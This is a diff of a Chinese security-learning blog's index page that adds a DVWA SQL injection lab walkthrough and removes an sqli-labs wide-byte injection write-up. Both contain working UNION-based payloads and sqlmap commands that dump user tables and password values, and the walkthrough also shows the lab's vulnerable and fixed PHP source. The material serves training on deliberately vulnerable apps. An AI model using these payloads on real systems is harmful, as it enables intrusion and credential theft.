@@ -64,6 +64,105 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-DVWA—SQL Injection" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/03/09/DVWA%E2%80%94SQL%20Injection/" class="article-date">
+  <time datetime="2021-03-09T13:20:45.370Z" itemprop="datePublished">2021-03-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/03/09/DVWA%E2%80%94SQL%20Injection/">DVWA—SQL Injection</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>之前有刷过sqlilabs，前言就不再介绍了。</p>
+<h1 id="Low："><a href="#Low：" class="headerlink" title="Low："></a>Low：</h1><h2 id="手工注入："><a href="#手工注入：" class="headerlink" title="手工注入："></a>手工注入：</h2><p><strong>1）判断是否存在注入点，注入点是字符型还是数字型</strong></p>
+<p>1’ and ‘1’=’1，成功</p>
+<p>1’ and ‘1’=’2，返回结果为空，存在说明存在注入点且为<code>&#39;</code></p>
+<p><strong>2）猜解SQL查询语句中的字段数</strong></p>
+<p>1’ order by 1#不报错；</p>
+<p>1’ order by 2#不报错；</p>
+<p>1’ order by 3#报错，说明SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
+<p><strong>3）判断回显位</strong></p>
+<p>0’ union select 1,2#![1](DVWA—SQL Injection/1.png)</p>
+<p>有两个回显位。</p>
+<p><strong>4）爆库</strong></p>
+<p>0’ union select 1,database()#![2](DVWA—SQL Injection/2.png)</p>
+<p><strong>5）爆表</strong></p>
+<p>0’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#![3](DVWA—SQL Injection/3.png)</p>
+<p><strong>6）爆列</strong></p>
+<p>0’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#</p>
+<p>![4](DVWA—SQL Injection/4.png)</p>
+<p><strong>7）爆值</strong></p>
+<p>0’ union select user,password from users#</p>
+<p>![5](DVWA—SQL Injection/5.png)</p>
+<p>或0’ union select 1,group_concat(user,0x3a,password) from users# </p>
+<p>![6](DVWA—SQL Injection/6.png)</p>
+<h2 id="利用sqlmap自动注入："><a href="#利用sqlmap自动注入：" class="headerlink" title="利用sqlmap自动注入："></a>利用sqlmap自动注入：</h2><p><strong>1）获取所有数据库</strong></p>
+<p>sqlmap.py -u “url”   –cookie “cookie中的内容” –dbs</p>
+<p>sp：　-u ： 指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1 </p>
+<p>​            –dbs：获取所有数据库</p>
+<p><strong>2）查询当前数据库名</strong></p>
+<p>sqlmap.py -u “url”   –cookie “cookie中的内容” –current-db</p>
+<p>sp： –current-db：查询当前数据库昵称</p>
+<p><strong>3）查表名</strong></p>
+<p>sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa –tables</p>
+<p>sp：-D：指定数据库</p>
+<p>　　–table：查询所有表</p>
+<p>​        –batch：批处理,也就是系统默认选项(按照默认的选项 全自动执行)</p>
+<p><strong>4）查列名</strong></p>
+<p>sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa -T users –columns</p>
+<p>sp：-T：指定表名</p>
+<p>​        –columns：查询所有列</p>
+<p><strong>5）查值</strong></p>
+<p>sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa -C user,password –dump</p>
+<p>sp：-C：指定columns 如果不指定,默认整表</p>
+<ul>
+<li>查看源码：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;   </span><br><span class="line">     <span class="comment">// Get input  </span></span><br><span class="line">     $id = $_REQUEST[ <span class="string">&#x27;id&#x27;</span> ];  </span><br><span class="line">     </span><br><span class="line">     <span class="comment">// Check database  </span></span><br><span class="line">     $query = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;            $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );         <span class="comment">// Get results  </span></span><br><span class="line">      <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;     </span><br><span class="line">      <span class="comment">// Get values     </span></span><br><span class="line">      $first = $row[<span class="string">&quot;first_name&quot;</span>];     </span><br><span class="line">      $last = $row[<span class="string">&quot;last_name&quot;</span>];     </span><br><span class="line">      </span><br><span class="line">      <span class="comment">// Feedback for end user     </span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;   &#125;   </span><br><span class="line">      mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]); </span><br><span class="line">      &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<h1 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h1><p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123; </span><br><span class="line"></span><br><span class="line">  <span class="comment">//Get input*</span></span><br><span class="line">  $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ]; </span><br><span class="line"></span><br><span class="line">  $id = mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">  $query = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>; </span><br><span class="line">  $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> ); </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="comment">//Get results </span></span><br><span class="line"><span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123; </span><br><span class="line">        <span class="comment">//Display values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到服务器使用mysql_real_escape_string()函数过滤了一些字符（其中包括反斜杠，单双引号），同时网页端选择了下拉选择菜单限制我们输入。但是我们看到本关的注入点为数字型，那么我们可以利用抓包的方式修改上传数据。![7](DVWA—SQL Injection/7.png)</p>
+<h1 id="High："><a href="#High：" class="headerlink" title="High："></a>High：</h1><p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>我们注意到这关的数据提交页面和查询结果返回页面不是同一个页面</p>
+<p>![8](DVWA—SQL Injection/8.png)</p>
+<p>但是这关如果用手工注入的话，难度和Low级别是一样的，那么这关针对防御的是一般的sqlmap注入，因为sqlmap在注入过程中，无法在数据提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p>
+<h1 id="Impossible："><a href="#Impossible：" class="headerlink" title="Impossible："></a>Impossible：</h1><p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/leezhxing/p/5282437.html">https://www.cnblogs.com/leezhxing/p/5282437.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/09/DVWA%E2%80%94SQL%20Injection/" data-id="ckr0oba2j000si8vu2hky3jdt" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DVWA-labs/" rel="tag">DVWA-labs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-DVWA—CSRF" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/03/04/DVWA%E2%80%94CSRF/" class="article-date">
@@ -1287,88 +1386,6 @@
 
 
   
-    <article id="post-lesson32-37" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/06/lesson32-37/" class="article-date">
-  <time datetime="2021-02-06T05:17:38.000Z" itemprop="datePublished">2021-02-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/06/lesson32-37/">lesson32-37</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="background——宽字节注入："><a href="#background——宽字节注入：" class="headerlink" title="background——宽字节注入："></a>background——宽字节注入：</h1><ul>
-<li><strong>原理：</strong>mysql在使用GBK编码的时候，会认为两个字符（前一个字符的ascii码必须大于128才能到汉字的范围）。）为一个汉字，例如%aa%5c就是一个汉字。</li>
-<li>以lesson32为例，查看源码发现PHP会对<code>\（反斜杠）</code>,<code>&#39;（单引号）</code>,<code>&quot;（双引号）</code>做转义处理</li>
-</ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function check_addslashes($string)</span><br><span class="line">&#123;</span><br><span class="line">    $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\&quot;, $string);          //escape any backslash</span><br><span class="line">    $string = preg_replace(&#x27;/\&#x27;/i&#x27;, &#x27;\\\&#x27;&#x27;, $string);                               //escape single quote <span class="keyword">with</span> a backslash</span><br><span class="line">    $<span class="keyword">string</span> = preg_replace(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash</span></span><br><span class="line"><span class="string">      </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    return $string;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// take the variables </span></span><br><span class="line"><span class="string">if(isset($_GET[&#x27;id&#x27;]))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">$id=check_addslashes($_GET[&#x27;id&#x27;]);</span></span><br><span class="line"><span class="string">//echo &quot;</span>The filtered request <span class="keyword">is</span> :<span class="string">&quot; .$id . &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="string">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span></span><br><span class="line"><span class="string">fwrite($fp,&#x27;ID:&#x27;.$id.&quot;</span>\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">fclose($fp);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// connectivity </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mysql_query(&quot;</span><span class="keyword">SET</span> <span class="keyword">NAMES</span> gbk<span class="string">&quot;);</span></span><br><span class="line"><span class="string">$sql=&quot;</span><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">$result=mysql_query($sql);</span></span><br><span class="line"><span class="string">//!对于源码的解读：我认为24-26行的命令目的是将sql语句用gbk编码，以防带入数据库后乱码。</span></span><br><span class="line"><span class="string">$row = mysql_fetch_array($result);</span></span><br></pre></td></tr></table></figure>
-
-<p>那么我们利用它会将sql语句转为gbk编码，通过吞并<code>\（url编码%5c）</code>的方式绕开其对单引号的转义。例如：%aa%5c，这在gbk编译后成为一个汉字。（gbk编码表<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php%EF%BC%89%E6%AF%94%E5%A6%82">https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php）比如</a> <code>乗</code> 字符，GBK编码 %81%5C</p>
-<p><strong>补充：</strong>有些符号（<code>#</code> <code>$</code> <code>^</code> <code>&amp;</code> <code>* </code> <code>+</code> =）在URL中是不能直接传递的，如果要在URL中传递这些特殊符号，那么就要使用他们的编码了。编码的格式为：%加字符的ASCII码，即一个百分号%，后面跟对应字符的ASCII（16进制）码值。（URL编码就是在uft-8编码的基础上，给编码的每个字节加上百分号。）</p>
-<h2 id="lesson32："><a href="#lesson32：" class="headerlink" title="lesson32："></a>lesson32：</h2><h3 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h3><p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,database()--+</span><br></pre></td></tr></table></figure>
-
-<h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479--+</span><br></pre></td></tr></table></figure>
-
-<p>注：爆表本应该是?id=%aa’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
-<p>但是因为PHP对<code>&#39;</code>转义，那么我们可以用十六进制来表示security</p>
-<h3 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h3><p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;0x7365637572697479--+</span><br></pre></td></tr></table></figure>
-
-<h3 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h3><p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;%aa&#39; union select 1,2,group_concat(username,0x2c,password) from users--+</span><br></pre></td></tr></table></figure>
-
-<h2 id="lesson33："><a href="#lesson33：" class="headerlink" title="lesson33："></a>lesson33：</h2><p>和lesson32一模一样。</p>
-<h2 id="lesson34："><a href="#lesson34：" class="headerlink" title="lesson34："></a>lesson34：</h2><p>这关我还以为会和之前两关一样，只不过改为post类型，结果发现了一些不同。</p>
-<p>当我在username输入admin%aa’ union select 1,database()#，登入失败，按理来说不应该呀。于是我用burpsuite抓包：</p>
-<p><img src="/lesson32/1.png" alt="1"></p>
-<p>我们明明输入的uname=admin%aa’ union select 1,database()#，可是我们看到多了一个<code>25</code>在%aa中间，这是什么情况呢？<strong>原来，get与post提交数据类型不同，get型如果输入符合url的格式那么就直接以url形式提交，也就是说遇到%aa这种直接当做url编码处理，而post型却不是这样，他会把你提交的%aa当做正常数据，然后进行url编码，于是就变成了%25aa。</strong></p>
-<ul>
-<li><p>那么我们要怎么避免这个问题呢?</p>
-</li>
-<li><p>我们可以用burp抓包，手动去掉<code>25</code></p>
-</li>
-</ul>
-<p><strong>补充：不同类型编码</strong></p>
-<p>UTF-16编码：一个英文字母字符或一个汉字字符存储都需要2个字节（Unicode扩展区的一些汉字存储需要4个字节）。<br>UTF-8编码：一个英文字符等于一个字节，一个中文（含繁体）等于三个字节。中文标点占三个字节，英文标点占一个字节<br>Unicode编码：一个英文等于两个字节，一个中文（含繁体）等于两个字节。中文标点占两个字节，英文标点占两个字节。</p>
-<p>—）我们还可以用另外一种方式：?id=牛’ or 1=1#    </p>
-<p><img src="/lesson32/2.png" alt="2"></p>
-<p>在经过url编码后，<code>牛</code>被编码成三个字节加上单引号一个字节，再加上单引号被转义后反斜杠一个字节，总共五个字节，我们已经知道gbk编码时两个字节为一汉字，那么这样转义单引号用的反斜杠被合并，单引号“逃逸”成功。</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/Unicode-UTF.php%E5%9C%A8%E7%BA%BFUnicode%E5%92%8CUTF%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E7%BD%91%E5%9D%80">https://www.qqxiuzi.cn/bianma/Unicode-UTF.php在线Unicode和UTF编码转换网址</a></li>
-</ul>
-<h2 id="lesson35："><a href="#lesson35：" class="headerlink" title="lesson35："></a>lesson35：</h2><p>没营养</p>
-<h2 id="lesson36："><a href="#lesson36：" class="headerlink" title="lesson36："></a>lesson36：</h2><p>和lesson32一样，只不过把过滤函数改成mysql_real_escape_string（）。</p>
-<h2 id="lesson37："><a href="#lesson37：" class="headerlink" title="lesson37："></a>lesson37：</h2><p>和lesson34一样，只不过把过滤函数改成mysql_real_escape_string（）。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/06/lesson32-37/" data-id="ckr0oba3c002qi8vu0g310trp" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -1419,6 +1436,10 @@
       <ul>
         
           <li>
+            <a href="/2021/07/20/buuctf10/">buuctf10</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/19/buuctf9/">buuctf9</a>
           </li>
         
@@ -1432,10 +1453,6 @@
         
           <li>
             <a href="/2021/07/14/buuctf6/">buuctf6</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B63/">攻防世界web进阶</a>
           </li>
         
       </ul>
